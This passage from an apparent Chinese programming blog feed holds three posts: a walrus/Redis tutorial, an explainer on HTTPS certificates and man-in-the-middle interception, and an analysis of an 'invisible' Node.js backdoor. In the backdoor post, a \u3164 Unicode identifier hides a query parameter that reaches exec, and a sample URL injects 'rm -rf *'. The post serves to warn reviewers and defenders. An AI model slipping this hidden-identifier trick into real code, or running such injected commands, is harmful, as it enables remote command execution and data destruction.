    <content type="html"><![CDATA[<p>在以前的文章里面，我给大家介绍了使用Python自带的LRU缓存实现带有过期时间的缓存：<a href="https://mp.weixin.qq.com/s/idD-i8mGHx9zSBEXYI1QWg" target="_blank" rel="noopener">一日一技：实现有过期时间的LRU缓存</a>。也讲过倒排索引：<a href="https://mp.weixin.qq.com/s/AEDfZLlGcG5cgStCt_ZkeA" target="_blank" rel="noopener">使用倒排索引极速提高字符串搜索效率</a>。但这些代码对初学者来说比较难，写起来可能会出错。</p><p>实际上，这些功能其实都可以使用Redis来实现，而且每个功能只需要1分钟就能做出来。全文搜索功能在搜索英文的时候，甚至可以智能识别拼写错误的问题。</p><a id="more"></a><p>要实现这些功能，只需要做两件事：</p><ol><li>安装Redis</li><li>Python安装第三方库：<code>walrus</code></li></ol><p>安装完成以后，我们来看看它有多简单：</p><h2 id="带过期时间的缓存装饰器"><a href="#带过期时间的缓存装饰器" class="headerlink" title="带过期时间的缓存装饰器"></a>带过期时间的缓存装饰器</h2><p>我们想实现一个装饰器，它装饰一个函数。让我在1分钟内多次访问函数的时候，使用缓存的数据；超过1分钟以后才重新执行函数的内部代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> walrus <span class="keyword">import</span> Database</span><br><span class="line"></span><br><span class="line">db = Database()</span><br><span class="line">cache = db.cache()</span><br><span class="line"></span><br><span class="line"><span class="meta">@cache.cached(timeout=60)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'函数真正运行起来'</span>)</span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">return</span> now</span><br><span class="line"></span><br><span class="line">now = test()</span><br><span class="line">print(<span class="string">'函数返回的数据是：'</span>, now)</span><br><span class="line">time.sleep(<span class="number">10</span>) <span class="comment"># 等待10秒，此时会使用缓存</span></span><br><span class="line">print(<span class="string">'函数返回的数据是：'</span>, test())</span><br><span class="line">time.sleep(<span class="number">5</span>) <span class="comment"># 等待5秒，此时依然使用缓存</span></span><br><span class="line">print(<span class="string">'函数返回的数据是：'</span>, test())</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">50</span>)  <span class="comment"># 让时间超过缓存的时间</span></span><br><span class="line">print(<span class="string">'函数返回的数据是：'</span>, test())</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228185527.png" alt></p><h2 id="全文搜索"><a href="#全文搜索" class="headerlink" title="全文搜索"></a>全文搜索</h2><p>我们再来看看全文搜索功能，实现起来也很简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> walrus <span class="keyword">import</span> Database</span><br><span class="line"></span><br><span class="line">db = Database()</span><br><span class="line">search = db.Index(<span class="string">'xxx'</span>)  <span class="comment"># 这个名字随便取</span></span><br><span class="line">poem1 = <span class="string">'Early in the day it was whispered that we should sail in a boat, only thou and I, and never a soul in the world would know of this our pilgrimage to no country and to no end.'</span></span><br><span class="line">poem2 = <span class="string">'Had I the heavens’ embroidered cloths,Enwrought with golden and silver light'</span></span><br><span class="line">poem3 = <span class="string">'to be or not to be, that is a question.'</span></span><br><span class="line"></span><br><span class="line">search.add(<span class="string">'docid1'</span>, poem1) <span class="comment"># 第一个参数不能重复</span></span><br><span class="line">search.add(<span class="string">'docid2'</span>, poem2)</span><br><span class="line">search.add(<span class="string">'docid3'</span>, poem3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> doc <span class="keyword">in</span> search.search(<span class="string">'end'</span>):</span><br><span class="line">    print(doc[<span class="string">'content'</span>])</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228191027.png" alt></p><p>如果你想让他兼容拼写错误，那么可以把<code>search = db.Index(&#39;xxx&#39;)</code>改成<code>search = db.Index(&#39;xxx’, metaphone=True)</code>，运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228191314.png" alt></p><p>不过遗憾的是，这个全文搜索功能只支持英文。</p><h2 id="频率限制"><a href="#频率限制" class="headerlink" title="频率限制"></a>频率限制</h2><p>我们有时候要限制调用某个函数的频率，或者网站的某个接口要限制IP的访问频率。这个时候，使用<code>walrus</code>也可以轻松实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> walrus <span class="keyword">import</span> Database</span><br><span class="line"></span><br><span class="line">db = Database()</span><br><span class="line">rate = db.rate_limit(<span class="string">'xxx'</span>, limit=<span class="number">5</span>, per=<span class="number">60</span>) <span class="comment"># 每分钟只能调用5次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">if</span> rate.limit(<span class="string">'xxx'</span>):</span><br><span class="line">        print(<span class="string">'访问频率太高！'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'还没有触发访问频率限制'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228192152.png" alt></p><p>其中参数<code>limit</code>表示能出现多少次，<code>per</code>表示在多长时间内。</p><p><code>rate.limit</code>只要传入相同的参数，那么就会开始检查这个参数在设定的时间内出现的频率。</p><p>你可能觉得这个例子并不能说明什么问题，那么我们跟FastAPI结合一下，用来限制IP访问接口的频率。编写如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> walrus <span class="keyword">import</span> Database, RateLimitException</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> JSONResponse</span><br><span class="line"></span><br><span class="line">db = Database()</span><br><span class="line">rate = db.rate_limit(<span class="string">'xxx'</span>, limit=<span class="number">5</span>, per=<span class="number">60</span>) <span class="comment"># 每分钟只能调用5次</span></span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.exception_handler(RateLimitException)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_rate_litmit_exception</span><span class="params">(request: Request, exc: RateLimitException)</span>:</span></span><br><span class="line">    msg = &#123;<span class="string">'success'</span>: <span class="literal">False</span>, <span class="string">'msg'</span>: <span class="string">f'请喝杯茶，休息一下，你的ip: <span class="subst">&#123;request.client.host&#125;</span>访问太快了！'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(status_code=<span class="number">429</span>, content=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get('/important_api')</span></span><br><span class="line"><span class="meta">@rate.rate_limited(lambda request: request.client.host)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_important_data</span><span class="params">(request: Request)</span>:</span></span><br><span class="line">    data = <span class="string">'重要数据'</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'success'</span>: <span class="literal">True</span>, <span class="string">'data'</span>: data&#125;</span><br></pre></td></tr></table></figure><p>上面代码定义了一个全局的异常拦截器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.exception_handler(RateLimitException)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_rate_litmit_exception</span><span class="params">(request: Request, exc: RateLimitException)</span>:</span></span><br><span class="line">    msg = &#123;<span class="string">'success'</span>: <span class="literal">False</span>, <span class="string">'msg'</span>: <span class="string">f'请喝杯茶，休息一下，你的ip: <span class="subst">&#123;request.client.host&#125;</span>访问太快了！'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(status_code=<span class="number">429</span>, content=msg)</span><br></pre></td></tr></table></figure><p>在整个代码的任何地方抛出了<code>RateLimitException</code>异常，就会进入这里的逻辑中。</p><p>使用装饰器<a href="mailto:`@rate.rat" target="_blank" rel="noopener">`@rate.rat</a>e_limited<code>装饰一个路由函数，并且这个装饰器要更靠近函数。路由函数接收什么参数，它就接收什么参数。在上面的例子中，我们只接收了</code>request<code>参数，用于获取访问者的IP。发现这个IP的访问频率超过了限制，就抛出一个</code>RateLimitException<code>。于是前面定义好的全局拦截器就会拦截</code>RateLimitException`异常，拦截到以后返回我们定义好的报错信息。</p><p>在频率范围内访问页面，返回正常的JSON数据：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228205416.png" alt></p><p>频率超过设定的值以后，访问页面就会报错，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211228205337.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>walrus</code>对<code>redis-py</code>进行了很好的二次封装，用起来非常顺手。除了上面我提到的三个功能外，它还可以实现几行代码生成布隆过滤器，实现自动补全功能，实现简易图数据库等等。大家可以访问它的<a href="https://walrus.readthedocs.io/en/latest/getting-started.html" target="_blank" rel="noopener">官方文档了解详细使用说明</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在以前的文章里面，我给大家介绍了使用Python自带的LRU缓存实现带有过期时间的缓存：&lt;a href=&quot;https://mp.weixin.qq.com/s/idD-i8mGHx9zSBEXYI1QWg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一日一技：实现有过期时间的LRU缓存&lt;/a&gt;。也讲过倒排索引：&lt;a href=&quot;https://mp.weixin.qq.com/s/AEDfZLlGcG5cgStCt_ZkeA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;使用倒排索引极速提高字符串搜索效率&lt;/a&gt;。但这些代码对初学者来说比较难，写起来可能会出错。&lt;/p&gt;
&lt;p&gt;实际上，这些功能其实都可以使用Redis来实现，而且每个功能只需要1分钟就能做出来。全文搜索功能在搜索英文的时候，甚至可以智能识别拼写错误的问题。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Redis" scheme="https://www.kingname.info/tags/Redis/"/>
    
      <category term="全文搜索" scheme="https://www.kingname.info/tags/%E5%85%A8%E6%96%87%E6%90%9C%E7%B4%A2/"/>
    
      <category term="缓存" scheme="https://www.kingname.info/tags/%E7%BC%93%E5%AD%98/"/>
    
      <category term="频率控制" scheme="https://www.kingname.info/tags/%E9%A2%91%E7%8E%87%E6%8E%A7%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>HTTPS 证书和中间人攻击的原理</title>
    <link href="https://www.kingname.info/2021/12/23/reason-for-mitm/"/>
    <id>https://www.kingname.info/2021/12/23/reason-for-mitm/</id>
    <published>2021-12-23T03:04:04.000Z</published>
    <updated>2021-12-23T03:05:23.644Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-17-02-03.png" alt="香格里拉古镇里面的牛肉火锅"></p><p>有同学在知识星球和公众号粉丝群里面提到，希望我讲一讲 HTTPS 证书、为什么使用 Charles、Fiddler、MitmProxy 抓 HTTPS 的请求要安装证书、 requests 发送请求的时候，verify 参数除了 False/True 还能填写什么参数。今天我们就这几个问题来做一个简单的介绍。</p><a id="more"></a><p>首先我们定义几个术语：</p><ul><li>公钥：一串字符串，在非对称加密里面用来加密数据，随意公开。</li><li>私钥：一串字符串，在非对称加密里面用来解密数据，不能泄露。根据私钥可以反推出公钥。</li><li>普通密钥：一串字符串。在对称加密里面，加密和解密都用它。</li></ul><p>首先关于HTTPS 链接的创建流程，网上已经有太多文章来介绍了。网上给出的流程，大概是这样的：</p><ol><li>客户端发送请求到服务器。</li><li>服务器把自己的公钥下发给客户端。</li><li>客户端使用这个公钥加密一个普通的密钥，并发送给服务器。</li><li>服务器使用私钥解密出这个普通的密钥。</li><li>接下来所有的请求都由这个普通的密钥通过对称加密来实现。</li></ol><p>并且，这些文章一般还会说道，对称加密速度快，但是加密解密使用的是同一个密钥。当你要传输这个密钥的时候可能会泄露；非对称加密，公钥可以随意公开，公钥加密，私钥解密。安全性高但是速度慢。所以 HTTPS 使用非对称加密用来传输普通密钥。这个普通密钥再来传输正常的数据。</p><p>这个流程看起来没有什么问题，也很合理。但是，它漏掉了一个很重要的东西：如何识别信息有没有被篡改或者监听？</p><p>我们说 HTTPS 协议正常情况下是不怕窃听的，也就是说，我即使在你家路由器上面安装一个监控程序，也无法监听到你的数据。但是上面这个流程，无法推导出这个结论：</p><p>如果我在你家的路由器上面安装了一个中间人监控的程序。那么，你的客户端第一次往服务器发送请求的时候，我就知道你要请求哪个网站了，这个时候，我首先假装服务器，让你把请求信息都发给我。然后我再假装客户端，把你的请求信息转发给服务器。服务器的公钥下发下来以后，监控程序保留这个公钥。监控程序自己也有一套公钥、私钥。他把自己的公钥发送给你。你以为这个公钥是服务器的，但实际上它是监控程序的。你用这个公钥加密普通密钥，监控程序能就使用自己的私钥来解密，拿到真正的对称加密的密钥。然后它再把普通密钥用服务器下发的公钥加密，传给服务器。接下来，服务器解密以后，用这个普通密钥加密数据，和它以为的客户端正常通信。</p><p>在这个过程中，客户端和服务器，完全不知道自己都在跟一个中间人进行通信。那么数据就这样轻易被监听了。</p><p>这样一来，HTTPS 的安全性意义在哪里？难道你要给监听的人说：你等一下，等我跟服务器交换完密钥以后，你再来监听？</p><p>使用 HTTPS，应该能保证，只要客户端和服务器是正常的，那么监听程序在中间的任何环节出现，我都不害怕。</p><p>HTTPS 之所以能这样保证，是因为它使用的是<a href="https://zh.wikipedia.org/wiki/X.509" target="_blank" rel="noopener">符合X.509标准的证书</a>，而不仅仅是公钥和私钥。</p><blockquote><p>国际电信联盟设计了一套专门针对证书格式的标准X.509，其核心提供了一种描述证书的格式。</p><p>X.509数字证书不仅包括用户名和密码，而且还包含了与用户有关的其他信息，通过使用证书，CA可以为证书接收者提供一种方法，使他们不仅信任证书主体的公钥，而且还信任有关证书主体的其他信息。</p></blockquote><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-14-40-02.png" alt></p><p>证书本质上就是一个文本文件。但是这个文件里面记录了很多其他信息，包括这个证书是谁颁发的，过期时间等等。</p><p>我们知道，要生成一个 SSL 证书，在 Linux 里面就是一条命令而已，非常简单。但是，国际电信联盟提供了一批值得信任的证书颁发机构，只有使用这些机构颁发的证书，浏览器才认为是安全的，才会出现绿色的锁。否则，如果你使用的不是认证机构颁发的证书，或者干脆你是自己一条命令生成的证书，那么当你访问网站的时候，就会变成下面这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-15-46.png" alt></p><p>这是因为，浏览器不知道你现在这个网站的证书，是真正服务器就用的自签证书，还是被中间人替换了。所以会给你发报警。如果你确认服务器就是这个自签证书，那么你就可以点<code>高级</code>-<code>继续访问</code>，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-18-10.png" alt></p><p>访问成功以后，浏览器地址栏也会提示你请求不安全：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-21-02.png" alt></p><p>如果你用 requests 请求这个网站，也会报错，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-20-12.png" alt></p><p>我们知道，requests 可以设置参数<code>verify=False</code>来强行访问使用了非认证机构颁发的证书的网站：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-23-28.png" alt></p><p>这里的<code>verify=False</code>，其实就相当于我们在浏览器上面点击了<code>高级</code>-<code>继续访问</code>。</p><p>除此之外，requests 的<code>verify</code>参数，还可以填写成一个文件地址：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-37-10.png" alt></p><p>这里的这个<code>test.cer</code>文件，就是我在使用<code>openssl</code>生成网站自签证书的时候，一并自动生成的。它同时包含了公钥和私钥。它长下面这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-40-00.png" alt></p><p>我们再来看看 Charles 的根证书：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-53-54.png" alt></p><p>他们的格式是一样的。所以，当我们要使用 Charles/Fiddler/MitmProxy 抓HTTPS 的时候，需要信任根证书，实际上就相当于使用<code>requests</code>的时候，把<code>verify=</code>设置为根证书的地址。</p><p>为什么 Charles 的根证书被信任了以后就可以抓包了？为什么requests 指定了根证书以后，访问使用自签证书的 https 网站就不报错了？这是因为，我们现在有办法可以检测数据是否被篡改过。</p><p>现在话又要说回私钥和公钥了。我们都知道，公钥可以对数据进行加密，私钥对数据进行解密。但是实际上，我们还可以用私钥对数据进行“加密”，公钥进行“解密”！注意这里的<code>加密</code>和<code>解密</code>，我打了引号，是因为准确的说，应该叫做用私钥对数据明文的摘要加密得到数字签名，用公钥可以验证这个数字签名是不是自己对应的那个私钥生成的。</p><p>服务器发给客户端的数据，除了客户端索要的数据外，还包括一份经过签名的摘要数据。客户端收到数据以后，用公钥就可以从签名里面解析出客户端需要的数据对应的摘要。客户端再把自己收到的数据使用摘要算法计算出一个摘要，两边一对比，就知道数据有没有被篡改。</p><p>自签证书不能伪装成可信机构签发的证书，就在于证书里面有一段数字签名，可信任机构颁发的证书，这个签名都是唯一的，自签证书如果修改了机构信息，那么新的摘要信息就跟那么这个数字签名解密后的摘要信息不匹配了。于是浏览器就会给你发出警报。</p><p>但当你信任了一个根证书以后，浏览器就不会发送警报了。所以如果你安装了来路不明的证书，那么你的客户端和服务器的通信就可能会被监听。</p><p>如果你看明白这篇文章，那么你应该会知道，如果你想使用 Charles 等等抓包工具，那么，根证书应该是安装到你的客户端。而不是安装到电脑上。例如你想抓手机的数据包，那么你应该把根证书安装到手机上，而不是安装到运行 Charles 的电脑上。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-17-02-03.png&quot; alt=&quot;香格里拉古镇里面的牛肉火锅&quot;&gt;&lt;/p&gt;
&lt;p&gt;有同学在知识星球和公众号粉丝群里面提到，希望我讲一讲 HTTPS 证书、为什么使用 Charles、Fiddler、MitmProxy 抓 HTTPS 的请求要安装证书、 requests 发送请求的时候，verify 参数除了 False/True 还能填写什么参数。今天我们就这几个问题来做一个简单的介绍。&lt;/p&gt;
    
    </summary>
    
      <category term="知识" scheme="https://www.kingname.info/categories/%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="中间人攻击" scheme="https://www.kingname.info/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
      <category term="HTTPS" scheme="https://www.kingname.info/tags/HTTPS/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：亲眼所见，也非真实，如何明目张胆架设后门程序</title>
    <link href="https://www.kingname.info/2021/12/23/backdoor-for-review/"/>
    <id>https://www.kingname.info/2021/12/23/backdoor-for-review/</id>
    <published>2021-12-23T02:55:43.000Z</published>
    <updated>2021-12-23T02:59:23.907Z</updated>
    
    <content type="html"><![CDATA[<p>以前有人说，开源项目非常安全，因为谁都可以看到代码，所以不怕里面藏有后门。</p><p>这样的言论显然非常天真，一来，并不会有很多人真的去看源代码；二来，有一些缺陷隐藏得很深，光看源代码看不出来，例如 log4j2；第三，有办法把后门藏在一段非常安全的代码里面，你即使看源代码也看不出哪里有问题。</p><a id="more"></a><p>今天这个案例，是我在网上闲逛(mo yu)的时候偶然发现的，它的做法非常精巧，可以称得上是光明正大开后门。</p><p>案例文章的原始地址是：<a href="https://certitude.consulting/blog/en/invisible-backdoor/" target="_blank" rel="noopener">The Invisible JavaScript Backdoor</a>这篇文章给出了一段看起来非常安全的Node.js 的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">const</span> exec = util.promisify(<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/network_health'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; timeout,ㅤ&#125; = req.query;</span><br><span class="line">    <span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤ</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="built_in">Promise</span>.all(checkCommands.map(<span class="function"><span class="params">cmd</span> =&gt;</span> </span><br><span class="line">                cmd &amp;&amp; exec(cmd, &#123; <span class="attr">timeout</span>: +timeout || <span class="number">5</span>_000 &#125;)));</span><br><span class="line">        res.status(<span class="number">200</span>);</span><br><span class="line">        res.send(<span class="string">'ok'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        res.status(<span class="number">500</span>);</span><br><span class="line">        res.send(<span class="string">'failed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>这段代码使用 Express 框架搭建了一个 API 接口，当你调用<code>http://127.0.0.1:8080/network_health</code>的时候，后台会首先<code>ping</code>一下 Google，然后再使用<code>curl</code>访问<code>http://example.com</code>。如果都成功了，那么显然你的网络是正常的，于是给你返回<code>ok</code>。你也可以设置参数<code>timeout=xxx</code>来限定这两个测试必需在多长时间内完成，否则视为网络有问题。</p><p>这个功能简单得不能再简单了，能有什么问题呢？我现在就把代码放到你的面前让你来Review，你能说我的代码有问题？</p><p>但实际上，上面这段代码确实有一个后门，可以让我在部署了这个接口的机器上执行任意命令，包括但不限于下载木马或者<code>rm -rf *</code>。</p><p>这段代码的问题，就出现在图中我画箭头的这两个地方：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-22-20-18-10.png" alt></p><p>这两个地方的逗号后面，并不是空格，而是一个看不见的符号：<code>\u3164</code>。我们知道，在 JavaScript 里面，几乎任何非关键字的Unicode 符号都可以用来当做变量名。而<code>\u3164</code>也是一个 Unicode 字符，所以它显然也可以当做变量名。</p><p>我们来看上面代码中，执行命令的地方：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤ</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="built_in">Promise</span>.all(checkCommands.map(<span class="function"><span class="params">cmd</span> =&gt;</span> </span><br><span class="line">                cmd &amp;&amp; exec(cmd, &#123; <span class="attr">timeout</span>: +timeout || <span class="number">5</span>_000 &#125;)));</span><br></pre></td></tr></table></figure><p>这里，Node.js 会调用系统 Shell 执行数组<code>checkCommands</code>中的<code>两条</code>命令。如果我这样写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hide_command = <span class="string">'rm -rf *'</span></span><br><span class="line"><span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤhide_command</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><p>那你肯定知道我执行了三条命令，其中第三个命令会删除电脑里面的文件。现在，我把里面的名字<code>hide_command</code>换成<code>\u3164</code>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ㅤ = <span class="string">'rm -rf *'</span></span><br><span class="line"><span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤ</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><p>你虽然可能会觉得<code>const ㅤ = &#39;rm -rf *&#39;</code>有点奇怪，但你应该不会怀疑下面的数组有什么问题。因为在你的眼里，这个数组<strong>只有</strong>两条命令，但它实际上有三条命令。</p><p>而这段攻击代码，把<code>const ㅤ = &#39;rm -rf *&#39;</code>这个奇怪的赋值语句也给隐藏到了<code>const { timeout,ㅤ} = req.query;</code>当中。因为在 Express 中，我们可以这样设置 URL 参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;id, name, type&#125; = req.query;</span><br></pre></td></tr></table></figure><p>那么，你在 URL 里面就可以使用这三个参数：<code>http://127.0.0.1:8000/network_health?id=xxx&amp;name=yyy&amp;type=zzz</code>。现在，这段有后门的代码，其实会接收两个参数，分别是<code>timeout</code>和<code>ㅤ</code>，其中后者这个看起来像是空格的就是<code>\u3164</code>，也就是变量名。所以，我可以通过访问 URL：<code>http://127.0.0.1:8000/network_health?timeout=10&amp;ㅤ=rm -rf *</code>。把删除系统文件的命令传入进来。这里可以传入任何 Shell 命令，如果不想删除对方的系统，那么可以通过执行 Shell 下载一个木马程序到对方的电脑上，然后就可以每天远程偷偷监控对方在干什么了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这样的后门真的是防不胜防。我也没有什么好办法能避免被欺骗。例如你在Github 上面看到有人开源了一个基于 Node.js 实现的电商系统，于是你就把它拿来用，搭建出了你自己的在线商城卖点小东西。也许某一天，你会发现你的账目对不上，也许就是因为这个系统里面留有这样的后门？</p><p>只能说最好的办法就是不要运行来历不明的代码，也不要因为代码是开源项目，就盲目觉得它很安全。</p>]]></content>
    
    <summary type="html">
    
